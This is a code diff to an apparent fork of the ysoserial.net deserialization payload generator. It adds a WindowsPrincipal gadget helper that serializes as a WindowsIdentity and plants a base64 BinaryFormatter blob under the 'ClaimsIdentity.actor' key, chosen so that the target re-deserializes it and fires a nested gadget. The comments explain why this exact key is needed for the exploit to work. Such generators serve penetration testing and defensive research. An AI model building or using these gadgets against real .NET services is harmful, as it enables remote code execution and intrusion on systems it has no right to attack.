@@ -75,7 +75,7 @@ namespace ysonet.Generators
             object innerIdentity;
             if (BridgedPayload != null)
             {
-                innerIdentity = new WindowsIdentityIdentityMarshal(Convert.ToBase64String((byte[])BridgedPayload));
+                innerIdentity = new WindowsPrincipalInnerIdentityMarshal(Convert.ToBase64String((byte[])BridgedPayload));
             }
             else
             {
@@ -275,12 +275,38 @@ namespace ysonet.Generators
 
     }
 
+    // The WindowsIdentity this gadget nests in m_identity when a bridge supplies the inner
+    // BinaryFormatter blob. It is this gadget's own payload shape - the target type, the member
+    // name and the fact that nothing else is written - so it lives here rather than being
+    // borrowed from WindowsIdentityGenerator, which is free to change what IT emits.
+    //
+    // The key must be "System.Security.ClaimsIdentity.actor" (or .bootstrapContext, or
+    // .claims): those are the three names ClaimsIdentity.Deserialize re-runs a BinaryFormatter
+    // on. Setting a plain BootstrapContext STRING on a live identity instead would just be
+    // stored, never re-deserialized, so the bridge would silently do nothing.
+    [Serializable]
+    public class WindowsPrincipalInnerIdentityMarshal : ISerializable
+    {
+        public WindowsPrincipalInnerIdentityMarshal(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsIdentity));
+            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
+        }
+    }
+
     [Serializable]
     public class WindowsPrincipalMarshal : ISerializable
     {
         public WindowsPrincipalMarshal() { }
-        // A live WindowsIdentity (default) or a WindowsIdentityIdentityMarshal (bridge); both
-        // serialize m_identity as a WindowsIdentity that fires the inner gadget.
+        // A live WindowsIdentity (default) or a WindowsPrincipalInnerIdentityMarshal (bridge);
+        // both serialize m_identity as a WindowsIdentity that fires the inner gadget.
         public object Identity { get; set; }
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
